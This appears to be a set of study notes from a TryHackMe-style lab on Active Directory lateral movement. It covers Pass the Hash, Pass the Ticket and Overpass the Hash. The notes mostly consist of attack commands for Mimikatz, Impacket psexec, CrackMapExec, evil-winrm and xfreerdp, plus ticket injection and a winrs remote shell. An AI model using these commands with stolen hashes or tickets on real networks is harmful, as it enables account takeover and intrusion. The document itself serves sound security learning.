# Pass The Hash
- As [[NetNTLM]] is inherently flawed, the password hash can be treated as a password.
- NTLM hash can be used to directly authenticate to a domain/service
- [[Active Directory/Credential Dumping/Mimikatz]] for extracting Credentials
### Mimikatz
```powershell
sekurlsa::pth /user:user.name /domain:za.tryhackme.com /ntlm:<hash> /run:<command>
```
### Impacket's PsExec.py
```bash
python psexec.py -hashes <hash> domain/username@<server/ip>
```
### Metasploit PsExec module
```
exploit/windows/smb/psexec
```
### Crackmapexec
```bash
crackmapexec smb <server/IP> -u username -H <hash>
```
### evil-winrm
```bash
evil-winrm -i <server/IP> -u <username> -H <hash>
```
### xfreerdp
```bash
xfreerdp /v:<server/IP> /u:<domain\username> /pth:<hash> 
```

# Pass The Ticket
- Export ticket with:
```powershell
sekurlsa::tickets /export
```
- Inject ticket to current session:
```mimikatz
kerberos::ptt <ticket_id>
```
- Verify ticket with:
```powershell
klist
```
- Get a shell
```powershell
# Credentails get automatically injected. similar to runas's /netonly
winrs.exe -r:<server/IP> cmd.exe
```

# Overpass The Hash/Pass The Key
- When a user requests a TGT, the TGT encrypts the timestamp and other details with a key derived from their password. 
- The algorithm used call be the following depending on the kerberos configuration :
	- DES (Deprecated)
	- RC4
	- AES128
	- AES256
- We can ask the Key Distrubution Center for TGT by passing this key through mimikatz
```powershell
sekurlsa::ekeys
```
- For RC4 Hash
```powershell
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:<hash> /run:"<command>"
```
- For AES128
```powershell
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:<hash> /run:"<command>"
```
- For AES256
```powershell
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:<hash> /run:"<command>"
```
Notice that when using RC4, the key will be equal to the NTLM hash of a user. This means that if we could extract the NTLM hash, we can use it to request a TGT as long as RC4 is one of the enabled protocols. This particular variant is usually known as Overpass-the-Hash (OPtH).